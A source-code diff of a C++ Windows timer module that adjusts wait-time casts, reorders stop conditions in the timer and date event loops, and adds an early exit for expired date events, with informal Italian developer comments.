@@ -147,9 +147,9 @@ DWORD WINAPI OnTimer(LPVOID lpParam) {
 			LONGLONG dwWait;
 
 			if (current < ts) { // We are just before the start time
-				dwWait = _WaitForSingleObject(eventHandle, (LONGLONG)(ts - current));
+				dwWait = _WaitForSingleObject(eventHandle, (DWORD)(ts - current));
 			} else { // Start time is tomorrow
-				dwWait = _WaitForSingleObject(eventHandle, (LONGLONG)(ts + date.getMsDay() - current));
+				dwWait = _WaitForSingleObject(eventHandle, (DWORD)(ts + date.getMsDay() - current));
 			}
 
 
@@ -218,7 +218,7 @@ DWORD WINAPI OnTimer(LPVOID lpParam) {
 
 			if (curIterations >= iterations) {
 				//questo chiude subito l'evento e non ha spetta la fine del timer me->triggerEnd(); //BYGIO Aggiunto da ritestare tutto per gestire la "generazione" del LOF T3 alla fine della gestione dell'evento
-				me->requestStop();
+				//me->requestStop(); BYGIO HO REMMATO QUESTO VEDIAMO CHE SUCCEDE perche' cosi' secondo me finite le iterazioni chiude il giro 
 				continue;
 			}
 
@@ -439,7 +439,8 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 	Event *me = (Event *)lpParam;
 	Configuration *conf;
 	Date date;
-	int delay, iterations, curIterations = 0, curDelay = 0;
+	int delay, iterations, curIterations = 0;
+	DWORD curDelay = 0;
 	unsigned __int64 startDate, now, endDate;
 	wstring dateFrom, dateTo;
 
@@ -490,7 +491,7 @@ else
 {
 
 	if (now < startDate) {
-		curDelay = (LONGLONG)(startDate - now);
+		curDelay = (DWORD)(startDate - now);
 		_WaitForSingleObject(evHandle, curDelay);
 		
 		if (me->shouldStop()) {
@@ -503,6 +504,14 @@ else
 		me->triggerStart();
 	}
 
+	// chiedere a que se per chiudere l'evento subito basta setstatus o se devo anche fare me->requestStop();
+	if (now > endDate) {
+		DBG_TRACE(L"Debug - Timer.cpp - Date Event is Closing\n", 1, FALSE);
+		me->setStatus(EVENT_STOPPED);
+
+		return 0;
+	}
+
 }
 
 	
@@ -513,7 +522,7 @@ else
 	
 	//se == INFINITE significa che non sono in repeat ma in start/stop
 	if (delay == INFINITE && endDate > now)
-		curDelay = (LONGLONG)(endDate - now); 
+		curDelay = (DWORD)(endDate - now); 
 	else
 		curDelay = delay; 
 
@@ -521,7 +530,7 @@ else
 
 	LOOP {
 
-
+		
 		_WaitForSingleObject(evHandle, curDelay);
 
 		if (me->shouldStop()) {
@@ -531,16 +540,18 @@ else
 			return 0;
 		}
 
-		if (curIterations >= iterations) {
-			me->requestStop();
-			continue;
-		}
-
 		if (date.getCurAbsoluteMs() > endDate) {
 			me->triggerEnd();
 			me->requestStop();
 			continue;
 		}
+		
+		if (curIterations >= iterations) {
+			//me->requestStop(); BYGIO HO REMMATO QUESTO VEDIAMO CHE SUCCEDE perche' cosi' secondo me finite le iterazioni chiude il giro 
+			continue;
+		}
+
+
 
 		me->triggerRepeat();
 		curIterations++;
